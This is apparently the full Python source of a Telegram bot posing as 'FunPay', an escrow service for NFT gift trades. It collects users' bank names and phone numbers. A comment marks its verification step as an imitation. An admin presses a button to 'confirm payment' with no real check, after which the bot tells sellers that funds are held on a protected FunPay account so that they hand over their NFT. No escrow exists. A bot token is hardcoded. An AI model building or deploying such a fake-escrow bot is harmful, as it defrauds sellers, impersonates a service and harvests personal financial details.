import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from datetime import datetime

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9185641906:AAHDMFMjBCRqN24BjGHW26DZW_J6FHyD1ec"
ADMIN_ID = 7532797597  
SUPPORT_LINK = "https://t.me/FunPayHelperRU"
COMMISSION_RATE = 0.03 # 3%
# ============================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# База данных в оперативке
users_db = {}      # {user_id: {"bank": "...", "phone": "...", "lang": "RU"}}
active_deals = {}  # Сделки
deal_counter = 1

class CreateDeal(StatesGroup):
    amount = State()
    nft_link = State()
    wait_bank = State()
    wait_phone = State()

# --- ГЕНЕРАТОР ID СДЕЛКИ ---
def gen_deal_id():
    global deal_counter
    deal_id = f"FUN-{deal_counter:04d}"
    deal_counter += 1
    return deal_id

# --- МЕНЮ ---
def main_menu(user_id):
    lang = users_db.get(user_id, {}).get("lang", "RU")
    
    if lang == "RU":
        kb = [
            [KeyboardButton(text="🤝 Создать сделку")],
            [KeyboardButton(text="📦 Мои сделки"), KeyboardButton(text="💳 Реквизиты")],
            [KeyboardButton(text="🌐 Язык"), KeyboardButton(text="🆘 Поддержка")]
        ]
    else:
        kb = [
            [KeyboardButton(text="🤝 Create deal")],
            [KeyboardButton(text="📦 My deals"), KeyboardButton(text="💳 Details")],
            [KeyboardButton(text="🌐 Language"), KeyboardButton(text="🆘 Support")]
        ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# --- СТАРТ ---
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    if user_id not in users_db:
        users_db[user_id] = {"lang": "RU", "bank": None, "phone": None}
    
    welcome_text = (
        "Добро пожаловать 👋\n\n"
        "🛡 FunPay — Мы специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n"
        "✨ Автоматизированный алгоритм исполнения.\n"
        "⚡ Скорость и автоматизация.\n"
        "📊 Удобный и быстрый вывод средств.\n\n"
        "▪️ Комиссия сервиса: 3%\n"
        "▪️ Режим работы: 24/7\n"
        "▪️ Техническая поддержка: @FunPayHelperRU\n\n"
        "👇 Выберите нужный раздел ниже:"
    )
    
    inline_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🤝 Создать сделку", callback_data="start_create_deal")]
    ])
    
    await message.answer_photo(
        photo="AgACAgIAAxkBAAEDIx1q825ucePNRzdgkIAGbyBxZMNAdAACxyFrG23gmUtey3umHg-B8gEAAwIAA3MAAz0E",
        caption=welcome_text,
        parse_mode="HTML",
        reply_markup=main_menu(user_id)
    )

# --- ОБРАБОТКА ИНЛАЙН-КНОПКИ СТАРТА ---
@dp.callback_query(F.data == "start_create_deal")
async def start_from_inline(call: CallbackQuery, state: FSMContext):
    await call.message.delete()
    await start_deal_process(call.message, state)
    await call.answer()

# --- МОИ СДЕЛКИ ---
@dp.message(F.text.in_(["📦 Мои сделки", "📦 My deals"]))
async def my_deals(message: Message):
    user_deals = [d for d in active_deals.values() if d["seller_id"] == message.from_user.id or d["buyer_id"] == message.from_user.id]
    
    if not user_deals:
        return await message.answer("У вас пока нет сделок.")
    
    text = "<b>📦 История ваших сделок:</b>\n\n"
    for d in reversed(user_deals):
        status_emoji = "🟢" if d["status"] == "completed" else "🟡"
        text += f"{status_emoji} <b>#{d['id']}</b> | {d['amount']} RUB\n"
        text += f"└ Статус: {d['status'].upper()}\n\n"
    
    await message.answer(text, parse_mode="HTML")

# --- РЕКВИЗИТЫ ---
@dp.message(F.text.in_(["💳 Реквизиты", "💳 Details"]))
async def my_details(message: Message):
    user = users_db.get(message.from_user.id)
    if user["bank"]:
        text = f"💳 <b>Ваши сохраненные реквизиты:</b>\n\n🏦 Банк: {user['bank']}\n📱 Тел: {user['phone']}"
    else:
        text = "💳 У вас еще нет сохраненных реквизитов. Они появятся после создания первой сделки."
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Изменить реквизиты", callback_data="change_details")]
    ])
    await message.answer(text, parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "change_details")
async def change_details(call: CallbackQuery, state: FSMContext):
    await call.message.edit_text("🏦 Введите название вашего банка:")
    await state.set_state(CreateDeal.wait_bank)
    await call.answer()

# --- ЯЗЫК ---
@dp.message(F.text.in_(["🌐 Язык", "🌐 Language"]))
async def change_lang(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_RU"),
         InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_EN")]
    ])
    await message.answer("Выберите язык / Choose language:", reply_markup=kb)

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang(call: CallbackQuery):
    lang = call.data.split("_")[1]
    users_db[call.from_user.id]["lang"] = lang
    await call.message.delete()
    await call.message.answer("Язык успешно изменен!" if lang == "RU" else "Language changed successfully!", reply_markup=main_menu(call.from_user.id))

# --- ПОДДЕРЖКА ---
@dp.message(F.text.in_(["🆘 Поддержка", "🆘 Support"]))
async def support(message: Message):
    await message.answer(
        f"🆘 <b>Техническая поддержка</b>\n\n"
        f"Если у вас возникли вопросы по сделке или работе сервиса, напишите нашему менеджеру:\n"
        f"👉 {SUPPORT_LINK}",
        parse_mode="HTML"
    )

# --- 1. СОЗДАНИЕ СДЕЛКИ (АВТОМАТИЗАЦИЯ) ---
async def start_deal_process(message: Message, state: FSMContext):
    user = users_db.get(message.from_user.id)
    
    if user["bank"]:
        await message.answer(f"✅ Использую ваши сохраненные реквизиты:\n🏦 {user['bank']}\n📱 {user['phone']}\n\n💰 <b>Введите сумму сделки (в RUB):</b>", parse_mode="HTML")
        await state.update_data(bank=user["bank"], phone=user["phone"])
        await state.set_state(CreateDeal.amount)
    else:
        await message.answer("🏦 <b>У вас еще нет сохраненных реквизитов.</b>\n\nВведите название вашего банка (например: Сбербанк, Тинькофф):", parse_mode="HTML")
        await state.set_state(CreateDeal.wait_bank)

@dp.message(F.text == "🤝 Создать сделку")
async def create_deal_btn(message: Message, state: FSMContext):
    await start_deal_process(message, state)

@dp.message(CreateDeal.wait_bank)
async def process_bank(message: Message, state: FSMContext):
    await state.update_data(bank=message.text)
    await message.answer("📱 Введите ваш номер телефона (привязанный к карте):")
    await state.set_state(CreateDeal.wait_phone)

@dp.message(CreateDeal.wait_phone)
async def process_phone(message: Message, state: FSMContext):
    await state.update_data(phone=message.text)
    
    # Сохраняем в профиль
    data = await state.get_data()
    users_db[message.from_user.id]["bank"] = data["bank"]
    users_db[message.from_user.id]["phone"] = data["phone"]
    
    await message.answer("💰 <b>Введите сумму сделки (в RUB):</b>", parse_mode="HTML")
    await state.set_state(CreateDeal.amount)

@dp.message(CreateDeal.amount)
async def process_amount(message: Message, state: FSMContext):
    try:
        amount = int(message.text)
    except ValueError:
        return await message.answer("❌ Введите сумму целым числом.")
    
    await state.update_data(amount=amount)
    await message.answer("🖼 <b>Отправьте ссылку на ваш NFT (подарок):</b>", parse_mode="HTML")
    await state.set_state(CreateDeal.nft_link)

@dp.message(CreateDeal.nft_link)
async def process_nft(message: Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    
    # Имитация проверки
    msg = await message.answer("⏳ <i>Проверка данных и создание защищенной сделки...</i>", parse_mode="HTML")
    await asyncio.sleep(2)
    
    deal_id = gen_deal_id()
    active_deals[deal_id] = {
        "id": deal_id,
        "seller_id": message.from_user.id,
        "seller_name": message.from_user.username or message.from_user.first_name,
        "buyer_id": None,
        "bank_name": data["bank"],
        "phone": data["phone"],
        "amount": data["amount"],
        "nft_link": message.text,
        "status": "open"
    }
    
    bot_info = await bot.get_me()
    pay_link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
    
    await msg.edit_text(
        f"✅ <b>Сделка успешно создана и защищена!</b>\n\n"
        f"🆔 ID сделки: <code>{deal_id}</code>\n"
        f"💰 Сумма: {data['amount']} RUB\n"
        f"🏦 Реквизиты: {data['bank']} ({data['phone']})\n\n"
        f"<b>Ссылка для покупателя:</b>\n<code>{pay_link}</code>\n\n"
        f"<i>Отправьте эту ссылку покупателю.</i>",
        parse_mode="HTML"
    )
    
    # УВЕДОМЛЕНИЕ АДМИНУ
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🛡 <b>АДМИН: НОВАЯ СДЕЛКА</b>\n\n"
             f"🆔 ID: {deal_id}\n"
             f"👤 Продавец: @{active_deals[deal_id]['seller_name']}\n"
             f"💰 Сумма: {data['amount']} RUB\n"
             f"🏦 Банк: {data['bank']}\n"
             f"📱 Тел: {data['phone']}\n"
             f"🖼 NFT: {message.text}",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 2. ПОКУПАТЕЛЬ ОТКРЫВАЕТ СДЕЛКУ ---
@dp.message(Command("start"), F.text.contains("deal_"))
async def start_deal_by_link(message: Message):
    deal_id = message.text.split("deal_")[1]
    deal = active_deals.get(deal_id)
    
    if not deal:
        return await message.answer("❌ Сделка не найдена или уже завершена.")
        
    deal["buyer_id"] = message.from_user.id
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Я оплатил", callback_data=f"pay_{deal_id}")]
    ])
    
    await message.answer(
        f"🛒 <b>Безопасная сделка #{deal_id}</b>\n\n"
        f"Продавец: @{deal['seller_name']}\n"
        f"Сумма: {deal['amount']} RUB\n"
        f"Товар: {deal['nft_link']}\n\n"
        f"<b>Реквизиты для оплаты:</b>\n"
        f"Банк: {deal['bank_name']}\n"
        f"Телефон: <code>{deal['phone']}</code>\n\n"
        f"Переведите средства и нажмите кнопку ниже.",
        parse_mode="HTML",
        reply_markup=kb
    )

# --- 3. ПОКУПАТЕЛЬ НАЖАЛ "Я ОПЛАТИЛ" ---
@dp.callback_query(F.data.startswith("pay_"))
async def buyer_paid(call: CallbackQuery):
    deal_id = call.data.split("_")[1]
    deal = active_deals.get(deal_id)
    
    if not deal:
        return await call.answer("Сделка не найдена.", show_alert=True)
    
    deal["status"] = "awaiting_confirm"
    await call.message.edit_text("⏳ <i>Проверяем поступление средств...</i>", parse_mode="HTML")
    await asyncio.sleep(1.5)
    
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"admin_confirm_{deal_id}"),
         InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin_reject_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔔 <b>ПОКУПАТЕЛЬ СООБЩИЛ ОБ ОПЛАТЕ</b>\n\n"
             f"🆔 ID: {deal_id}\n"
             f"👤 Покупатель: @{call.from_user.username}\n"
             f"💰 Сумма: {deal['amount']} RUB",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 4. АДМИН ПОДТВЕРЖДАЕТ ИЛИ ОТКЛОНЯЕТ ---
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⚠️ Сделка уже обрабатывается.", show_alert=False)
    
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    
    deal["status"] = "paid"
    await call.message.edit_text(f"✅ Сделка {deal_id} подтверждена. Средства зарезервированы.")
    
    commission = round(deal['amount'] * COMMISSION_RATE)
    net_amount = deal['amount'] - commission
    
    seller_text = (
        f"✅ <b>Средства по сделке получены и зарезервированы!</b>\n\n"
        f"📄 <b>Детали:</b>\n"
        f"├ Сумма: <b>{deal['amount']} RUB</b>\n"
        f"├ Комиссия сервиса (3%): <b>{commission} RUB</b>\n"
        f"├ <b>К зачислению: {net_amount} RUB</b>\n"
        f"└ Товар: {deal['nft_link']}\n\n"
        f"Покупатель успешно перевел средства. Они находятся на защищенном счете FunPay.\n\n"
        f"Передайте NFT покупателю. После подтверждения передачи, средства будут зачислены на ваши реквизиты ({deal['bank_name']}: {deal['phone']}).\n\n"
        f"<i>Для завершения нажмите кнопку ниже.</i>"
    )
    
    seller_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 Я передал NFT", callback_data=f"seller_done_{deal_id}")]
    ])
    
    try:
        await bot.send_message(deal["seller_id"], seller_text, parse_mode="HTML", reply_markup=seller_kb)
        await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата подтверждена!</b>\nСредства зарезервированы. Ожидайте получения NFT.", parse_mode="HTML")
    except: pass

@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⚠️ Нет прав.", show_alert=False)
    
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    deal["status"] = "rejected"
    
    await call.message.edit_text(f"❌ Сделка {deal_id} отклонена.")
    
    try:
        await bot.send_message(deal["seller_id"], f"❌ <b>Сделка {deal_id} отклонена.</b>\nПричина: подозрительная активность аккаунта. Средства не были зарезервированы.", parse_mode="HTML")
        await bot.send_message(deal["buyer_id"], f"❌ <b>Сделка {deal_id} отклонена администратором.</b>\nЕсли вы перевели средства, напишите в поддержку: {SUPPORT_LINK}", parse_mode="HTML")
    except: pass

# --- 5. ПРОДАВЕЦ ПЕРЕДАЛ NFT ---
@dp.callback_query(F.data.startswith("seller_done_"))
async def seller_done(call: CallbackQuery):
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    deal["status"] = "moderation"
    
    await call.message.edit_text(
        f"⏳ <b>Заявка на завершение сделки принята!</b>\n\n"
        f"🛡 <b>Система безопасности:</b>\n"
        f"├ Статус: <i>Передано в отдел модерации</i>\n"
        f"├ Проверка транзакции: <i>В процессе...</i>\n"
        f"└ Ожидаемое время: <i>до 15 минут</i>\n\n"
        f"<i>Алгоритм проверяет историю передачи подарка. Ожидайте уведомления.</i>",
        parse_mode="HTML"
    )
    
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить передачу NFT", callback_data=f"admin_confirm_nft_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🛡 <b>АДМИН: ЗАПРОС НА МОДЕРАЦИЮ</b>\n\n"
             f"🆔 ID: {deal_id}\n"
             f"👤 Продавец: @{deal['seller_name']}\n"
             f"💰 Сумма: {deal['amount']} RUB\n"
             f"🖼 NFT: {deal['nft_link']}\n\n"
             f"Продавец заявил о передаче. Подтвердите для закрытия сделки.",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 6. АДМИН ПОДТВЕРЖДАЕТ ПЕРЕДАЧУ NFT ---
@dp.callback_query(F.data.startswith("admin_confirm_nft_"))
async def admin_confirm_nft(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⚠️ Нет прав.", show_alert=False)
    
    deal_id = call.data.split("_")[3]
    deal = active_deals.get(deal_id)
    deal["status"] = "completed"
    
    await call.message.edit_text(f"✅ Модерация пройдена. Сделка {deal_id} закрыта.")
    
    commission = round(deal['amount'] * COMMISSION_RATE)
    net_amount = deal['amount'] - commission
    
    try:
        await bot.send_message(
            deal["seller_id"], 
            f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК</b>\n\n"
            f"✅ <b>Модерация успешно завершена!</b>\n\n"
            f"Передача NFT подтверждена. Сделка закрыта.\n"
            f"К зачислению: <b>{net_amount} RUB</b> (за вычетом комиссии 3%).\n\n"
            f"<i>Спасибо за использование нашего сервиса!</i>", 
            parse_mode="HTML"
        )
        await bot.send_message(
            deal["buyer_id"], 
            f"🎉 <b>Сделка {deal_id} успешно завершена!</b>\n\n"
            f"🛡 <b>Система безопасности подтвердила передачу NFT.</b>\n"
            f"Проверьте ваш кошелек. Спасибо, что доверяете нам!", 
            parse_mode="HTML"
        )
    except: pass

async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
